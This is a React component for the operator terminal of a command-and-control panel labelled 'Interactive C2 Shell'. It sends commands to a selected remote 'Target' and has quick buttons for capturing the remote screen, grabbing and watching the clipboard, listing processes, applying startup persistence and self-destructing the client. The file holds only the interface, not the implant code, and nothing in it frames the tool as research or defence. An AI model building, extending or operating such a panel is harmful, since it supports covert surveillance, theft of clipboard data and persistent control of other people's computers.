import { useRef, useEffect, useState } from 'react';
import { Send, Copy, Trash2, Check } from 'lucide-react';
import type { Client } from '../types';
import Tooltip from './Tooltip';

interface TerminalProps {
  clients: Client[];
  selectedClientId: string;
  termLogs: string[];
  termInput: string;
  setTermInput: (v: string) => void;
  suggestions: string[];
  setSuggestions: (s: string[]) => void;
  executeCommand: (cmd: string, silent?: boolean) => void;
  handleInputChange: (val: string) => void;
}

const QUICK_COMMANDS = [
  { label: 'sysinfo', cmd: 'sysinfo', tip: 'System information' },
  { label: 'screenshot', cmd: 'screenshot', tip: 'Capture remote screen' },
  { label: 'ps', cmd: 'ps', tip: 'List running processes' },
  { label: 'clip', cmd: 'clip', tip: 'Grab clipboard' },
  { label: 'clipwatch', cmd: 'clipwatch', tip: 'Start clipboard monitor' },
  { label: 'clipstop', cmd: 'clipstop', tip: 'Stop clipboard monitor' },
  { label: 'persist', cmd: 'persist', tip: 'Apply startup persistence' },
  { label: 'kill', cmd: 'kill', tip: 'Self-destruct client' },
];

export default function Terminal({
  clients, selectedClientId, termLogs, termInput, setTermInput,
  suggestions, setSuggestions, executeCommand, handleInputChange
}: TerminalProps) {
  const scrollRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const [history, setHistory] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem('term_history') || '[]'); } catch { return []; }
  });
  const [histIdx, setHistIdx] = useState(-1);
  const [copiedIdx, setCopiedIdx] = useState<number | null>(null);

  // Auto-scroll terminal output
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [termLogs]);

  const pushHistory = (cmd: string) => {
    const trimmed = cmd.trim();
    if (!trimmed) return;
    setHistory(prev => {
      const next = [...prev.filter(c => c !== trimmed), trimmed].slice(-100);
      localStorage.setItem('term_history', JSON.stringify(next));
      return next;
    });
    setHistIdx(-1);
  };

  const handleExec = (cmd: string, silent?: boolean) => {
    if (!silent) pushHistory(cmd);
    executeCommand(cmd, silent);
  };

  const onKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      handleExec(termInput);
    } else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (!history.length) return;
      const next = histIdx === -1 ? history.length - 1 : Math.max(0, histIdx - 1);
      setHistIdx(next);
      const val = history[next] || '';
      setTermInput(val);
      handleInputChange(val);
      requestAnimationFrame(() => inputRef.current?.setSelectionRange(val.length, val.length));
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (histIdx === -1) return;
      const next = histIdx + 1;
      if (next >= history.length) {
        setHistIdx(-1);
        setTermInput('');
        handleInputChange('');
      } else {
        setHistIdx(next);
        const val = history[next] || '';
        setTermInput(val);
        handleInputChange(val);
      }
    } else if (e.ctrlKey && e.key.toLowerCase() === 'l') {
      e.preventDefault();
      // Clear visible logs by dispatching a synthetic clear — parent owns logs but we can signal via empty string hack
      // Instead emit a local clear marker; App.tsx cap keeps scroll clean
      const ev = new CustomEvent('term-clear');
      window.dispatchEvent(ev);
    } else if (e.key === 'Escape') {
      setSuggestions([]);
    }
  };

  const targetDisplay = selectedClientId && clients.some(c => c.id === selectedClientId)
    ? selectedClientId
    : (clients.length > 0 ? clients[0].id : 'None Selected');

  return (
    <div className="h-full flex flex-col space-y-4">
      {/* Target header */}
      <div className="bg-c2card border border-c2border p-3 rounded flex items-center justify-between">
        <span className="text-xs font-mono text-c2accent">
          Target: {targetDisplay}
        </span>
        <div className="flex items-center space-x-2">
          <span className="text-[10px] text-slate-500 font-mono hidden sm:inline">↑/↓ history • Ctrl+L clear • Esc dismiss</span>
          <Tooltip text="Clear terminal" position="top">
            <button onClick={() => window.dispatchEvent(new CustomEvent('term-clear'))} className="p-1.5 bg-c2pill border border-c2border rounded hover:bg-c2card text-slate-400 hover:text-white">
              <Trash2 className="w-3.5 h-3.5" />
            </button>
          </Tooltip>
          <span className="text-xs text-slate-400">Interactive C2 Shell</span>
        </div>
      </div>

      {/* Output log */}
      <div
        ref={scrollRef}
        className="flex-1 bg-slate-950 border border-c2border rounded p-4 font-mono text-[11px] overflow-y-auto space-y-1 shadow-inner scrollbar-thin scrollbar-thumb-c2border scrollbar-track-transparent"
      >
        {termLogs.map((log, i) => {
          const isNoResponse = log.includes('NO RESPONSE');
          const isFailed = log.startsWith('[-]') || isNoResponse;
          // Extract retry command from "Retry with: <cmd>" line for interactive retry
          const retryMatch = termLogs[i + 1]?.match(/Retry with:\s*(.+)/) || log.match(/Retry with:\s*(.+)/);
          const retryCmd = retryMatch ? retryMatch[1].trim() : null;
          return (
            <div
              key={i}
              className={`group flex items-start justify-between gap-2 whitespace-pre-wrap break-all leading-relaxed ${isNoResponse ? 'bg-red-500/10 border border-red-500/30 rounded px-2 py-1' : ''} ${
                log.startsWith('>') ? 'text-c2accent font-bold mt-2' :
                log.startsWith('[+]') ? 'text-emerald-400 mt-1' :
                isFailed ? 'text-red-400 mt-1' :
                'text-slate-300 pl-4 border-l border-slate-800 ml-1 py-1'
              }`}
            >
              <span className="flex-1">{log}</span>
              <div className="flex items-center gap-1 shrink-0">
                {isNoResponse && retryCmd && (
                  <button
                    onClick={() => handleExec(retryCmd)}
                    className="opacity-0 group-hover:opacity-100 px-2 py-0.5 bg-red-500/20 hover:bg-red-500 text-red-300 hover:text-white rounded text-[10px] font-bold border border-red-500/30 transition-all"
                    title={`Retry: ${retryCmd}`}
                  >
                    ↻ Retry
                  </button>
                )}
                <button
                  onClick={() => { navigator.clipboard.writeText(log); setCopiedIdx(i); setTimeout(() => setCopiedIdx(null), 1200); }}
                  className="opacity-0 group-hover:opacity-100 p-1 rounded hover:bg-slate-800 text-slate-500 hover:text-white transition-opacity"
                  title="Copy line"
                >
                  {copiedIdx === i ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                </button>
              </div>
            </div>
          );
        })}
      </div>

      {/* Quick command buttons */}
      <div className="flex items-center space-x-2 overflow-x-auto pb-1">
        {QUICK_COMMANDS.map((item) => (
          <Tooltip key={item.label} text={item.tip} position="top">
            <button
              onClick={() => handleExec(item.cmd)}
              className="px-2.5 py-1 bg-c2card border border-c2border rounded text-xs font-mono hover:bg-c2accent hover:text-slate-950 transition-colors whitespace-nowrap"
            >
              {item.label}
            </button>
          </Tooltip>
        ))}
      </div>

      {/* Input row */}
      <div className="relative">
        {suggestions.length > 0 && (
          <div className="absolute bottom-full mb-1 left-0 w-full bg-c2card border border-c2border rounded shadow-lg overflow-hidden z-10">
            {suggestions.map((sug, i) => (
              <div
                key={i}
                onClick={() => { setTermInput(sug); setSuggestions([]); }}
                className="px-3 py-2 text-xs font-mono hover:bg-c2accent hover:text-slate-950 cursor-pointer border-b border-c2border/50 last:border-0"
              >
                {sug}
              </div>
            ))}
          </div>
        )}
        <div className="flex space-x-2">
          <input
            ref={inputRef}
            type="text"
            value={termInput}
            onChange={(e) => handleInputChange(e.target.value)}
            onKeyDown={onKeyDown}
            placeholder="Enter command... (↑/↓ history, Ctrl+L clear)"
            className="flex-1 bg-c2card border border-c2border rounded px-4 py-2.5 text-sm font-mono focus:outline-none focus:border-c2accent"
          />
          <Tooltip text="Send command to remote machine" position="top">
            <button
              onClick={() => handleExec(termInput)}
              className="px-5 py-2.5 bg-c2accent text-slate-950 font-semibold rounded hover:bg-blue-500 transition-colors flex items-center space-x-2"
            >
              <Send className="w-4 h-4" />
              <span>Execute</span>
            </button>
          </Tooltip>
        </div>
      </div>
    </div>
  );
}
